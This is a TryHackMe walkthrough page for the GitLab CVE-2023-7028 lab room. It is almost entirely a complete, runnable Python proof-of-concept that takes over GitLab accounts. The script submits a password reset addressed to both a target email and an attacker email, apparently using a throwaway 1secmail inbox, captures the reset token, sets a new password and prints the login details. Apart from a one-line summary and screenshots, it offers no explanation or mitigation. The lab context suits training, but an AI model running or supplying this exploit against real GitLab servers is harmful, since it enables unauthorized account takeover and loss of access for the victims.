### 22-Jan-24-Mon

[TryHackMe | GitLab CVE-2023-7028](https://tryhackme.com/room/gitlabcve20237028)

## GitLab CVE-2023-7028

*Learn to exploit a GitLab instance using CVE-2023-7028 and understand various mitigation techniques.*

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/0e8e5b4f-cad3-4c29-90ad-27f8a72f1822)

[POC](https://github.com/Vozec/CVE-2023-7028/blob/main/CVE-2023-7028.py)

```
import requests
import argparse
from urllib.parse import urlparse, urlencode
from random import choice
from time import sleep
import re

requests.packages.urllib3.disable_warnings()

class OneSecMail_api:
    def __init__(self):
        self.url = "https://www.1secmail.com"
        self.domains = []

    def get_domains(self):
        print('[DEBUG] Scrapping available domains on 1secmail.com')
        html = requests.get(f'{self.url}').text
        pattern = re.compile(r'<option value="([a-z.1]+)" data-prefer')
        self.domains = pattern.findall(html)
        print(f'[DEBUG] {len(self.domains)} domains found')

    def get_email(self):
        print('[DEBUG] Getting temporary mail')
        if self.domains == []:
            self.get_domains()
        if self.domains == []:
            return None
        name = ''.join([choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(10)])
        domain = choice(self.domains)
        mail = f'{name}@{domain}'
        print(f'[DEBUG] Temporary mail: {mail}')
        return mail

    def get_mail_ids(self, name, domain):
        print(f'[DEBUG] Getting last mail for {name}@{domain}')
        html = requests.post(f'{self.url}/mailbox',
                             verify=False,
                             data={
                                 'action': 'getMessages',
                                 'login': name,
                                 'domain': domain
                             }).text
        pattern = re.compile(r'<a href="/mailbox/\?action=readMessageFull&(.*?)">')
        mails = pattern.findall(html)
        return mails

    def get_last_mail(self, mail):
        name, domain = mail.split('@')
        mails = self.get_mail_ids(name, domain)
        print(f'[DEBUG] {len(mails)} mail(s) found')
        if mails == []:
            return None
        print(f'[DEBUG] Reading the last one')
        html = requests.get(f'{self.url}/mailbox/?action=readMessageFull&{mails[0]}', verify=False).text
        content = html.split('<div id="messageBody">')[1].split('<div id="end1sMessageBody">')[0]
        return content


class CVE_2023_7028:
    def __init__(self, url, target, evil=None):
        self.use_temp_mail = False
        self.mail_api = OneSecMail_api()
        self.url = urlparse(url)
        self.target = target
        self.evil = evil
        self.s = requests.session()

        if self.evil is None:
            self.use_temp_mail = True
            self.evil = self.mail_api.get_email()
            if not self.evil:
                print('[DEBUG] Failed ... quitting')
                exit()

    def get_authenticity_token(self, code=''):
        try:
            print('[DEBUG] Getting authenticity_token ...')
            endpoint = f'/users/password/edit?reset_password_token={code}'
            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/{endpoint}', verify=False).text
            regex = r'<input type="hidden" name="authenticity_token" value="(.*?)" autocomplete="off" />'
            token = re.findall(regex, html)[0]
            print(f'[DEBUG] authenticity_token = {token}')
            return token
        except Exception:
            print('[DEBUG] Failed ... quitting')
            return None

    def get_csrf_token(self):
        try:
            print('[DEBUG] Getting authenticity_token ...')
            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False).text
            regex = r'<meta name="csrf-token" content="(.*?)" />'
            token = re.findall(regex, html)[0]
            print(f'[DEBUG] authenticity_token = {token}')
            return token
        except Exception:
            print('[DEBUG] Failed ... quitting')
            return None

    def ask_reset(self):
        token = self.get_csrf_token()
        if not token:
            return False

        query_string = urlencode({
            'authenticity_token': token,
            'user[email][]': [self.target, self.evil]
        }, doseq=True)

        head = {
            'Origin': f'{self.url.scheme}://{self.url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        print('[DEBUG] Sending reset password request')
        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                           data=query_string,
                           headers=head,
                           verify=False).text
        sended = 'If your email address exists in our database' in html
        if sended:
            print(f'[DEBUG] Emails sended to {self.target} and {self.evil} !')
        else:
            print('[DEBUG] Failed ... quitting')
        return sended

    def parse_email(self, content):
        try:
            pattern = re.compile(r'/users/password/edit\?reset_password_token=(.*?)"')
            token = pattern.findall(content)[0]
            return token
        except:
            return None

    def get_code(self, max_attempt=5, delay=7.5):
        if not self.use_temp_mail:
            url = input('\tInput link received by mail: ')
            pattern = re.compile(r'(https?://[^"]+/users/password/edit\?reset_password_token=([^"]+))')
            match = pattern.findall(url)
            if len(match) != 1:
                return None
            return match[0][1]
        else:
            for k in range(1, max_attempt+1):
                print(f'[DEBUG] Waiting mail, sleeping for {str(delay)} seconds')
                sleep(delay)
                print(f'[DEBUG] Getting link using temp-mail | Try N°{k} on {max_attempt}')
                last_email = self.mail_api.get_last_mail(self.evil)
                if last_email is not None:
                    code = self.parse_email(last_email)
                    return code

    def reset_password(self, password):
        code = self.get_code()

        if not code:
            print('[DEBUG] Failed ... quitting')
            return False

        print('[DEBUG] Generating new password')
        charset = 'abcdefghijklmnopqrstuvwxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

        if password is None:
            password = ''.join(choice(charset) for _ in range(20))

        authenticity_token = self.get_authenticity_token(code)
        if authenticity_token is None:
            return False

        print(f'[DEBUG] Changing password to {password}')

        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                           verify=False,
                           data={
                               '_method': 'put',
                               'authenticity_token': authenticity_token,
                               'user[reset_password_token]': code,
                               'user[password]': password,
                               'user[password_confirmation]': password
                           }).text
        success = 'Your password has been changed successfully.' in html
        if success:
            print('[DEBUG] CVE_2023_7028 succeed !')
            print(f'\tYou can connect on {self.url.scheme}://{self.url.netloc}/users/sign_in')
            print(f'\tUsername: {self.target}')
            print(f'\tPassword: {password}')
        else:
            print('[DEBUG] Failed ... quitting')


def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on gitlab')
    parser.add_argument("-u", "--url", dest="url", type=str, required=True, help="Gitlab url")
    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target email")
    parser.add_argument("-e", "--evil", dest="evil", default=None, type=str, required=False, help="Evil email")
    parser.add_argument("-p", "--password", dest="password", default=None, type=str, required=False, help="Password")
    return parser.parse_args()


if __name__ == '__main__':
    args = parse_args()
    exploit = CVE_2023_7028(
        url=args.url,
        target=args.target,
        evil=args.evil
    )
    if not exploit.ask_reset():
        exit()
    exploit.reset_password(password=args.password)
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/fe35248e-95e0-43b9-a041-ec6cd58d788d)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/58a69712-06c6-4785-9eaa-7b7328d186aa)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/79bb52df-6e66-49bd-a23d-a83948bab9b6)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/50704e69-c43e-4f1c-8f72-dfcc46d01264)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/afbf68ea-869b-488e-a61d-16f037effeab)
